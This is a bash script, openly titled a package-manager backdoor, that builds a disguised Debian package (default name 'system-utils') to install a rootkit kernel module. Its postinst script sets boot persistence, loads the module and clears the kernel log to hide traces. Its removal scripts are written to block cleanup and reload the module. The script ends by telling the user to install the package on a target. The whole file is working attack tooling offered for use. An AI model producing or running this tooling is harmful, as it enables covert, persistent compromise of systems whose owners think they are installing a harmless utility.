#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] Package Manager Backdoor (.deb) [*] "
echo ""
echo "This creates a malicious Debian package (.deb) with a postinst"
echo "script that installs and loads a rootkit module on package install."
echo ""

# Check for dpkg-deb
if ! command -v dpkg-deb &>/dev/null; then
    echo "[ERROR] dpkg-deb not found. This feature requires a Debian-based system." >&2
    exit 1
fi

read -p "Enter the full path to the .ko module file: " ko_path

if [ ! -f "$ko_path" ]; then
    echo "[ERROR] Module file not found at $ko_path" >&2
    exit 1
fi

modname=$(basename "$ko_path" .ko)
KVER=$(uname -r)

read -p "Enter a disguise package name (default: system-utils): " pkg_name
pkg_name="${pkg_name:-system-utils}"

read -p "Enter package version (default: 1.0.0): " pkg_ver
pkg_ver="${pkg_ver:-1.0.0}"

read -p "Enter package description (default: System utility package): " pkg_desc
pkg_desc="${pkg_desc:-System utility package}"

# Output location
read -p "Output directory for .deb (default: /tmp): " outdir
outdir="${outdir:-/tmp}"

BUILDDIR=$(mktemp -d /tmp/debpkg.XXXXXX)
DEB_ROOT="$BUILDDIR/${pkg_name}_${pkg_ver}"

echo "[+] Building package structure..."

# Create directory structure
mkdir -p "$DEB_ROOT/DEBIAN"
mkdir -p "$DEB_ROOT/lib/modules/$KVER/kernel/drivers/misc/"

# Copy module
cp "$ko_path" "$DEB_ROOT/lib/modules/$KVER/kernel/drivers/misc/${modname}.ko"

# Create control file
ARCH=$(dpkg --print-architecture 2>/dev/null || echo "amd64")
cat > "$DEB_ROOT/DEBIAN/control" <<CTLEOF
Package: ${pkg_name}
Version: ${pkg_ver}
Architecture: ${ARCH}
Maintainer: System Administrator <admin@localhost>
Description: ${pkg_desc}
 Required system maintenance utilities.
Priority: optional
Section: admin
CTLEOF

# Create postinst script — runs after package installation
cat > "$DEB_ROOT/DEBIAN/postinst" <<'POSTEOF'
#!/bin/bash
MODNAME="PLACEHOLDER_MODNAME"

# Run depmod to register the module
depmod -a 2>/dev/null

# Set up boot persistence
grep -qxF "$MODNAME" /etc/modules 2>/dev/null || echo "$MODNAME" >> /etc/modules
mkdir -p /etc/modules-load.d/
echo "$MODNAME" > /etc/modules-load.d/${MODNAME}.conf

# Load the module now
modprobe "$MODNAME" 2>/dev/null

# Clean install traces
dmesg -C 2>/dev/null

exit 0
POSTEOF
sed -i "s/PLACEHOLDER_MODNAME/$modname/g" "$DEB_ROOT/DEBIAN/postinst"
chmod 755 "$DEB_ROOT/DEBIAN/postinst"

# Create prerm script — prevents easy removal
cat > "$DEB_ROOT/DEBIAN/prerm" <<'PRERMEOF'
#!/bin/bash
# Silently fail to prevent uninstall from cleaning up
exit 0
PRERMEOF
chmod 755 "$DEB_ROOT/DEBIAN/prerm"

# Create postrm script — re-loads if someone tries to remove
cat > "$DEB_ROOT/DEBIAN/postrm" <<'POSTRMEOF'
#!/bin/bash
MODNAME="PLACEHOLDER_MODNAME"

# If the module is still on disk, reload it
if [ -f "/lib/modules/$(uname -r)/kernel/drivers/misc/${MODNAME}.ko" ]; then
    insmod "/lib/modules/$(uname -r)/kernel/drivers/misc/${MODNAME}.ko" 2>/dev/null
fi

exit 0
POSTRMEOF
sed -i "s/PLACEHOLDER_MODNAME/$modname/g" "$DEB_ROOT/DEBIAN/postrm"
chmod 755 "$DEB_ROOT/DEBIAN/postrm"

# Build the package
echo "[+] Building .deb package..."
DEB_FILE="${outdir}/${pkg_name}_${pkg_ver}_${ARCH}.deb"
dpkg-deb --build "$DEB_ROOT" "$DEB_FILE" 2>/dev/null

if [ $? -eq 0 ]; then
    echo "[+] Package built: $DEB_FILE"
else
    echo "[ERROR] Failed to build .deb package" >&2
    rm -rf "$BUILDDIR"
    exit 1
fi

# Clean up build directory
rm -rf "$BUILDDIR"

read -p "Install the package now? (y/n): " install_now
if [[ "$install_now" == "y" || "$install_now" == "Y" ]]; then
    echo "[+] Installing package..."
    dpkg -i "$DEB_FILE" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[*] Package installed successfully. Module loaded."
    else
        echo "[ERROR] Package installation failed." >&2
    fi
fi

clear

echo "[*] Success!! Malicious .deb package created: $DEB_FILE [*]"
echo "    Package: $pkg_name v$pkg_ver ($ARCH)"
echo "    Module:  $modname"
echo "    Install on target with: dpkg -i $DEB_FILE"
echo "    The postinst script auto-loads the module and sets boot persistence."

sleep 2

clear
